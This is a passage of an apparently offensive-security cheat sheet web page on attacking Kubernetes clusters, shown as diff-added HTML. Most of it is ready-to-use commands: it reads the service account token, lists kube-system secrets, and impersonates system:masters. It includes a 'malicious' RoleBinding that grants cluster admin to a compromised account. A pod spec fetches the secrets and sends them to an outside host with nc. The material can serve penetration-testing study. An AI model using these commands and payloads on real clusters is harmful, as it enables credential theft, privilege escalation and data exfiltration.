+</span></span><span style="display:flex;"><span>I1028 <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38.295722</span>   <span style="color:#ae81ff">76118</span> round_trippers.go<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">438</span>] POST https<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">1.2</span>.3.<span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5678</span>/apis/authorization.k8s.io/v1/selfsubjectrulesreviews <span style="color:#ae81ff">201</span> Created <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">101</span> milliseconds
+</span></span><span style="display:flex;"><span>I1028 <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38.295760</span>   <span style="color:#ae81ff">76118</span> round_trippers.go<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">444</span>] Response Headers<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="information-gathering">
+  Information Gathering
+  <a class="anchor" href="#information-gathering">#</a>
+</h2>
+<h3 id="service-account-permissions">
+  Service Account Permissions
+  <a class="anchor" href="#service-account-permissions">#</a>
+</h3>
+<p>The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier.<br>
+The following can be used to determine the service account&rsquo;s permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Namespace-level permissions using kubectl</span>
+</span></span><span style="display:flex;"><span>kubectl auth can-i --list
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cluster-level permissions using kubectl</span>
+</span></span><span style="display:flex;"><span>kubectl auth can-i --list --namespace=kube-system
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Permissions list using curl</span>
+</span></span><span style="display:flex;"><span>NAMESPACE=$(cat <span style="color:#e6db74">&#34;/var/run/secrets/kubernetes.io/serviceaccount/namespace&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For cluster-level, use NAMESPACE=&#34;kube-system&#34; instead</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MASTER_URL=<span style="color:#e6db74">&#34;https://</span>${KUBERNETES_SERVICE_HOST}<span style="color:#e6db74">:</span>${KUBERNETES_SERVICE_PORT}<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>TOKEN=$(cat <span style="color:#e6db74">&#34;/var/run/secrets/kubernetes.io/serviceaccount/token&#34;</span>)
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;</span>${MASTER_URL}<span style="color:#e6db74">/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&#34;</span> \
+</span></span><span style="display:flex;"><span>  --cacert <span style="color:#e6db74">&#34;/var/run/secrets/kubernetes.io/serviceaccount/ca.crt&#34;</span> \
+</span></span><span style="display:flex;"><span>  --header <span style="color:#e6db74">&#34;Authorization: Bearer </span>${TOKEN}<span style="color:#e6db74">&#34;</span> \
+</span></span><span style="display:flex;"><span>  --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> \
+</span></span><span style="display:flex;"><span>  --data <span style="color:#e6db74">&#39;{&#34;kind&#34;:&#34;SelfSubjectRulesReview&#34;,&#34;apiVersion&#34;:&#34;authorization.k8s.io/v1&#34;,&#34;spec&#34;:{&#34;namespace&#34;:&#34;&#39;</span>${NAMESPACE}<span style="color:#e6db74">&#39;&#34;}}&#39;</span>
+</span></span></code></pre></div><h3 id="secrets-configmaps-and-volumes">
+  Secrets, ConfigMaps, and Volumes
+  <a class="anchor" href="#secrets-configmaps-and-volumes">#</a>
+</h3>
+<p>Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster.</p>
+<p>From a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It&rsquo;s not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with <code>grep -F &quot;tmpfs ro&quot; /etc/mtab</code>.</p>
+<p>True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with <code>grep -wF &quot;ext4&quot; /etc/mtab</code>.</p>
+<h3 id="privileged-containers">
+  Privileged Containers
+  <a class="anchor" href="#privileged-containers">#</a>
+</h3>
+<p>Kubernetes supports a wide range of 
+  <a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">security contexts</a> for container and pod execution. The most important of these is the &ldquo;privileged&rdquo; 
+  <a href="https://kubernetes.io/docs/concepts/policy/pod-security-policy/">security policy</a> which makes the host node&rsquo;s devices available under the container&rsquo;s <code>/dev</code> directory. This means having access to the host&rsquo;s Docker socket file (allowing arbitrary container actions) in addition to the host&rsquo;s root disks (which can be used to escape the container entirely).</p>
+<p>While there is no official way to check for privileged mode from <em>within</em> a container, checking if <code>/dev/kmsg</code> exists will usually suffice.</p>
+<h2 id="rbac-configuration">
+  RBAC Configuration
+  <a class="anchor" href="#rbac-configuration">#</a>
+</h2>
+<h3 id="listing-secrets">
+  Listing Secrets
+  <a class="anchor" href="#listing-secrets">#</a>
+</h3>
+<p>An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in &ldquo;kube-system&rdquo; namespace.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/api/v1/namespaces/kube-system/secrets/
+</span></span></code></pre></div><h3 id="access-any-resource-or-verb">
+  Access Any Resource or Verb
+  <a class="anchor" href="#access-any-resource-or-verb">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>resources<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>verbs<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span></code></pre></div><h3 id="pod-creation">
+  Pod Creation
+  <a class="anchor" href="#pod-creation">#</a>
+</h3>
+<p>Check your right with <code>kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml</code>.
+Then create a malicious pod.yaml file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">alpine</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">kube-system</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">alpine</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">alpine</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">args</span>: [<span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#39;apk update &amp;&amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H &#34;Authorization: Bearer $TOKEN&#34; -H &#34;Content-Type: application/json&#34; https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000&#39;</span>]
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">bootstrap-signer</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">automountServiceAccountToken</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p>Then <code>kubectl apply -f malicious-pod.yaml</code></p>
+<h3 id="privilege-to-use-podsexec">
+  Privilege to Use Pods/Exec
+  <a class="anchor" href="#privilege-to-use-podsexec">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>kubectl exec -it &lt;POD NAME&gt; -n &lt;PODS NAMESPACE&gt; <span style="color:#960050;background-color:#1e0010">–</span>- sh
+</span></span></code></pre></div><h3 id="privilege-to-getpatch-rolebindings">
+  Privilege to Get/Patch Rolebindings
+  <a class="anchor" href="#privilege-to-getpatch-rolebindings">#</a>
+</h3>
+<p>The purpose of this JSON file is to bind the admin &ldquo;CluserRole&rdquo; to the compromised service account.
+Create a malicious RoleBinging.json file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;apiVersion&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;rbac.authorization.k8s.io/v1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;kind&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;RoleBinding&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;metadata&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;malicious-rolebinding&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;namespcaes&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;default&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;roleRef&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;apiGroup&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;kind&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;ClusterRole&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;subjects&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;kind&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;ServiceAccount&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;sa-comp&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;namespace&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;default&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k -v -X POST -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;JWT TOKEN&gt;&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/apis/rbac.authorization.k8s.io/v1/namespaces/<span style="color:#66d9ef">default</span>/rolebindings -d @malicious-RoleBinging.json
+</span></span><span style="display:flex;"><span>curl -k -v -X POST -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;COMPROMISED JWT TOKEN&gt;&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/api/v1/namespaces/kube-system/secret
+</span></span></code></pre></div><h3 id="impersonating-a-privileged-account">
+  Impersonating a Privileged Account
+  <a class="anchor" href="#impersonating-a-privileged-account">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k -v -XGET -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;JWT TOKEN (of the impersonator)&gt;&#34;</span> -H <span style="color:#e6db74">&#34;Impersonate-Group: system:masters&#34;</span> -H <span style="color:#e6db74">&#34;Impersonate-User: null&#34;</span> -H <span style="color:#e6db74">&#34;Accept: application/json&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/api/v1/namespaces/kube-system/secrets/
+</span></span></code></pre></div><h2 id="privileged-service-account-token">
+  Privileged Service Account Token
+  <a class="anchor" href="#privileged-service-account-token">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ cat /run/secrets/kubernetes.io/serviceaccount/token
+</span></span><span style="display:flex;"><span>$ curl -k -v -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/api/v1/namespaces/<span style="color:#66d9ef">default</span>/secrets/
+</span></span></code></pre></div><h2 id="interesting-endpoints-to-reach">
+  Interesting endpoints to reach
+  <a class="anchor" href="#interesting-endpoints-to-reach">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># List Pods</span>
+</span></span><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/api/v1/namespaces/<span style="color:#66d9ef">default</span>/pods/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List secrets</span>
+</span></span><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/api/v1/namespaces/<span style="color:#66d9ef">default</span>/secrets/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List deployments</span>
+</span></span><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/apis/extensions/v1beta1/namespaces/<span style="color:#66d9ef">default</span>/deployments
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List daemonsets</span>
+</span></span><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;jwt_token&gt;&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;master_ip<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/apis/extensions/v1beta1/namespaces/<span style="color:#66d9ef">default</span>/daemonsets
+</span></span></code></pre></div><h2 id="api-addresses-that-you-should-know">
+  API addresses that you should know
+  <a class="anchor" href="#api-addresses-that-you-should-know">#</a>
+</h2>
+<p><em>(External network visibility)</em></p>
+<h3 id="cadvisor">
+  cAdvisor
+  <a class="anchor" href="#cadvisor">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP Address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4194</span>
+</span></span></code></pre></div><h3 id="insecure-api-server">
+  Insecure API server
+  <a class="anchor" href="#insecure-api-server">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP Address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div><h3 id="secure-api-server">
+  Secure API Server
+  <a class="anchor" href="#secure-api-server">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP Address&gt;<span style="color:#960050;background-color:#1e0010">:</span>(<span style="color:#ae81ff">8</span>|<span style="color:#ae81ff">6</span>)<span style="color:#ae81ff">443</span>/swaggerapi
+</span></span><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP Address&gt;<span style="color:#960050;background-color:#1e0010">:</span>(<span style="color:#ae81ff">8</span>|<span style="color:#ae81ff">6</span>)<span style="color:#ae81ff">443</span>/healthz
+</span></span><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP Address&gt;<span style="color:#960050;background-color:#1e0010">:</span>(<span style="color:#ae81ff">8</span>|<span style="color:#ae81ff">6</span>)<span style="color:#ae81ff">443</span>/api/v1
+</span></span></code></pre></div><h3 id="etcd-api">
+  etcd API
+  <a class="anchor" href="#etcd-api">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2379</span>
+</span></span><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2379</span>/version
+</span></span><span style="display:flex;"><span>etcdctl --endpoints=http<span style="color:#960050;background-color:#1e0010">:</span>//&lt;MASTER-IP&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2379</span> get / --prefix --keys-only
+</span></span></code></pre></div><h3 id="kubelet-api">
+  Kubelet API
+  <a class="anchor" href="#kubelet-api">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10250</span>
+</span></span><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10250</span>/metrics
+</span></span><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10250</span>/pods
+</span></span></code></pre></div><h3 id="kubelet-read-only">
+  kubelet (Read only)
+  <a class="anchor" href="#kubelet-read-only">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -k https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP Address&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10255</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//&lt;external-IP&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10255</span>/pods
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://securityboulevard.com/2019/08/kubernetes-pentest-methodology-part-1">Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019</a></li>
+<li>
+  <a href="https://securityboulevard.com/2019/09/kubernetes-pentest-methodology-part-2">Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019</a></li>
+<li>
+  <a href="https://securityboulevard.com/2019/11/kubernetes-pentest-methodology-part-3">Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019</a></li>
+<li>
+  <a href="https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0">Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</a></li>
+<li>
+  <a href="https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation">Kubernetes Pod Privilege Escalation</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/kuburnetes.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#kubernetes">Kubernetes</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#container-environment">Container Environment</a>
+          <ul>
+            <li><a href="#service-account">Service Account</a></li>
+            <li><a href="#environment-variables">Environment Variables</a></li>
+            <li><a href="#simulating-kubectl-api-requests">Simulating <code>kubectl</code> API Requests</a></li>
+          </ul>
+        </li>
+        <li><a href="#information-gathering">Information Gathering</a>
+          <ul>
+            <li><a href="#service-account-permissions">Service Account Permissions</a></li>
+            <li><a href="#secrets-configmaps-and-volumes">Secrets, ConfigMaps, and Volumes</a></li>
+            <li><a href="#privileged-containers">Privileged Containers</a></li>
+          </ul>
+        </li>
+        <li><a href="#rbac-configuration">RBAC Configuration</a>
+          <ul>
+            <li><a href="#listing-secrets">Listing Secrets</a></li>
+            <li><a href="#access-any-resource-or-verb">Access Any Resource or Verb</a></li>
+            <li><a href="#pod-creation">Pod Creation</a></li>
+            <li><a href="#privilege-to-use-podsexec">Privilege to Use Pods/Exec</a></li>
+            <li><a href="#privilege-to-getpatch-rolebindings">Privilege to Get/Patch Rolebindings</a></li>
+            <li><a href="#impersonating-a-privileged-account">Impersonating a Privileged Account</a></li>
+          </ul>
+        </li>
+        <li><a href="#privileged-service-account-token">Privileged Service Account Token</a></li>
+        <li><a href="#interesting-endpoints-to-reach">Interesting endpoints to reach</a></li>
+        <li><a href="#api-addresses-that-you-should-know">API addresses that you should know</a>
+          <ul>
+            <li><a href="#cadvisor">cAdvisor</a></li>
+            <li><a href="#insecure-api-server">Insecure API server</a></li>
+            <li><a href="#secure-api-server">Secure API Server</a></li>
+            <li><a href="#etcd-api">etcd API</a></li>
+            <li><a href="#kubelet-api">Kubelet API</a></li>
+            <li><a href="#kubelet-read-only">kubelet (Read only)</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
